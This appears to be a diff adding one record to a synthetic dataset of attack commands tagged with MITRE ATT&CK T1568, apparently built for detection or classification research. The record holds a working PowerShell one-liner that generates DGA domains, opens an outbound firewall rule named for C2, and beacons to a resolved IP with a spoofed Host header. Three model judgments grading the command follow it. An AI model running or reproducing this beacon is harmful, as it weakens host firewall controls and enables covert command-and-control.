@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='pool';$date=(Get-Date -Format 'yyyyMMdd');$dlist=1..10|%{(''+$seed+$_+'.'+$date+'.com')};$d=$dlist|Get-Random;try{$a=Resolve-DnsName $d -Type A -ErrorAction Stop;$ips=$a|Select-Object -ExpandProperty IPAddress;$ip=$ips[(Get-Random -Min 0 -Max $ips.Count)];$port=(Get-Random -Min 20000 -Max 20300);netsh advfirewall firewall add rule name='c2_out_'+$port dir=out action=allow protocol=TCP remoteip=$ip remoteport=$port;Invoke-WebRequest -Uri ('http://'+$ip+':'+$port+'/k') -Headers @{Host=$d;Rand='1'} -UseBasicParsing -TimeoutSec 5}catch{}",
+  "explanation": "Builds a DGA pool, selects a current candidate and one of its A records, then communicates directly to the IP on a high, randomized port while spoofing the Host header for dynamic domain alignment.",
+  "rationale_steps": [
+    "Rotate among multiple candidate domains and their flux IPs.",
+    "Use a non-standard port and Host header to maintain domain-based routing semantics."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-45dc1ae3",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell one-liner is well-formed with balanced quoting/braces, valid cmdlets/parameters, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-style domain generation, resolution, and IP-based contact consistent with T1568, but Host header overriding may be blocked, single-record indexing can break, and the firewall rule likely requires admin.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T05:52:38.666771Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced quotes and valid cmdlet usage, though the string concatenation in the netsh rule name ('c2_out_'+$port) may cause issues since PowerShell string concatenation with + in an unquoted context within a shell command could be problematic, and the $dlist generation using '' as a prefix is slightly awkward but parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by constructing a date-seeded DGA domain list, randomly selecting a candidate, resolving its A records, picking a random IP and high ephemeral port, adding a firewall rule to permit outbound C2 traffic, and beaconing via HTTP with a spoofed Host header — all hallmarks of dynamic resolution C2 with fast-flux and DGA characteristics.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T00:21:13.776490Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell code is syntactically correct, featuring valid variable interpolation, piping, and error handling structures.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively demonstrates T1568 (DGA/Dynamic Resolution), though the firewall manipulation (netsh) requires administrative privileges not specified in the metadata.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:21:19.570592Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
